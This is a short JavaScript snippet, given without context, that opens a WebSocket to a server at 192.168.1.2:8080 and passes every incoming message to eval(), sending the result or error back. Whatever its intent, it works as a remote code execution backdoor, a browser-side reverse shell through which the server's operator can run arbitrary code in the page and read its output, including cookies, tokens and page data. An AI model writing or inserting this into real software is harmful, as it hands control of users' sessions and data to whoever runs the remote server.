var ws = new WebSocket("ws://192.168.1.2:8080");
ws.onopen = () => ws.send("Connected to WebSocket server");
ws.onmessage = (msg) => {
    try {
        const result = eval(msg.data);
        ws.send("Result: " + result);
    } catch (err) {
        ws.send("Error: " + err);
    }
};
ws.onclose = () => console.log("Connection closed");